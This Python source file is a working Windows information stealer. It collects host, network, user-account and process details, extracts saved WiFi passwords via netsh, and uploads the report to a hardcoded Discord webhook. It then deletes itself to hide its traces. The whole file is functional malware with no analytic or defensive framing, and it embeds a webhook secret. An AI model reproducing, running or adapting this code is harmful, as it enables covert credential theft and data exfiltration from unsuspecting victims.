import os
import sys
import json
import subprocess
import tempfile
import platform
import socket
import getpass
import time
import urllib.request
import urllib.parse

# Your Discord webhook
WEBHOOK_URL = "https://discordapp.com/api/webhooks/1446630967832744037/S0e26cEzguLQFxnIDd48A_qW9L3ZgBlYPiIZD_m-IyIWtCz85kUxjZiojzbXBXbfKvMq"


def run_cmd(cmd):
    """Execute command and return output"""
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
        return result.stdout + result.stderr
    except:
        return ""


def get_wifi_passwords():
    """Extract WiFi passwords"""
    wifi_data = "\n=== WiFi PASSWORDS ===\n"
    try:
        profiles = run_cmd("netsh wlan show profiles")
        for line in profiles.split('\n'):
            if "All User Profile" in line or "Profil Tous les utilisateurs" in line:
                profile = line.split(":")[1].strip()
                profile_info = run_cmd(f'netsh wlan show profile name="{profile}" key=clear')
                for pass_line in profile_info.split('\n'):
                    if "Key Content" in pass_line:
                        password = pass_line.split(":")[1].strip()
                        wifi_data += f"{profile} : {password}\n"
                        break
    except:
        wifi_data += "Failed to get WiFi passwords\n"
    return wifi_data


def send_to_discord(data):
    """Send data to Discord webhook"""
    try:
        # Create boundary
        boundary = "----WebKitFormBoundary" + "".join([str(i) for i in range(10)])

        # Build the body
        body = []
        body.append(f'--{boundary}')
        body.append('Content-Disposition: form-data; name="content"')
        body.append('')
        body.append('🔓 SYSTEM COMPROMISED - Python Stealer')
        body.append(f'--{boundary}')
        body.append('Content-Disposition: form-data; name="file"; filename="system_report.txt"')
        body.append('Content-Type: text/plain')
        body.append('')
        body.append(data)
        body.append(f'--{boundary}--')
        body.append('')

        body_bytes = '\r\n'.join(body).encode('utf-8')

        # Create request
        req = urllib.request.Request(WEBHOOK_URL, data=body_bytes)
        req.add_header('Content-Type', f'multipart/form-data; boundary={boundary}')
        req.add_header('User-Agent', 'Mozilla/5.0')

        # Send
        urllib.request.urlopen(req, timeout=30)
        return True
    except Exception as e:
        # Simple fallback
        try:
            payload = {"content": f"🔓 SYSTEM DATA\n{data[:1500]}"}
            data_bytes = json.dumps(payload).encode('utf-8')
            req = urllib.request.Request(WEBHOOK_URL, data=data_bytes, headers={'Content-Type': 'application/json'})
            urllib.request.urlopen(req, timeout=10)
        except:
            pass
        return False


def main():
    """Main collection function"""
    # Collect data
    data = "=== SYSTEM COMPROMISE REPORT ===\n\n"
    data += f"Time: {time.ctime()}\n"
    data += f"Computer: {socket.gethostname()}\n"
    data += f"User: {getpass.getuser()}\n"
    data += f"OS: {platform.platform()}\n\n"

    data += "=== SYSTEM INFO ===\n"
    data += run_cmd("systeminfo") + "\n"

    data += "=== NETWORK INFO ===\n"
    data += run_cmd("ipconfig /all") + "\n"

    data += "=== USER ACCOUNTS ===\n"
    data += run_cmd("net user") + "\n"

    data += get_wifi_passwords()

    data += "\n=== RUNNING PROCESSES ===\n"
    data += run_cmd("tasklist")[:2000] + "\n"

    # Send to Discord
    send_to_discord(data)

    # Cleanup
    try:
        if os.path.exists(sys.argv[0]):
            os.remove(sys.argv[0])
    except:
        pass


if __name__ == "__main__":
    main()